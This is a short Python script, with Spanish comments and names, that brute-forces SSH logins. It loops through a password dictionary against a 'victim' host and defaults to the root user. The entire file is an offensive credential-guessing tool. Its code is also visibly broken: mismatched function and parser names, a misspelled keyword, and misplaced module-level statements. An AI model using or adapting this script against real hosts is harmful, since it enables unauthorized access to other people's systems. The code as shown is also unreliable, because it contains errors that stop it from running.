

import paramiko
import socket
from optparse import OptionParser

def fuerza_bruta(victima, usuario, puerto, diccionario):
        try:
             f=open(diccionario, "r")
             for pwd in f:
                 pwd=pwd[:-1]
                 ssh=paramiko.SSHClient()
                 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 try:
                        ssh.connect(victima, puerto, usuario, pwd)
                        print("[+] Password encontrado: %s"%pwd)
                        break;
                 except paramiko.AuthenticationException:
                       print("[-] Password no encontrado: %s"%pwd)
                 except socket.error:
                       print("[-] Fallo al establecer la conexión por ssh")
                       break;
                 ssh.close()
        except IOError:
                print("[-] %sDiccionario no encontrado"%diccionario)

def mani():
        parse = OptionParser()
        parse.add_option("-v", "-- victima", dest="victima", type="string", help="victima para hacer la fuerza bruta", metavar="IP/URL")
        parse.add_option("-u","--usuario", dest="usuario",type="string", help="Usuario victima", metavar="username", default="root")
        parse.add_option("-p", "--puerto", dest="port", type="int", help="Puerto ssh", metavar="Port", defalt="22")
        parse.add_option("-d", "--diccionario", dest="dicci", type="string", help="Diccionario", metavar="El diccionario")

options,args=parser.parse_args()

if options.victima and options.dicci:
   fuerza_bruta(options.victima, options.usuario, options.port, options.dicci)
else:
     parser.print_help()

if __name__ =="__main__":
        main()                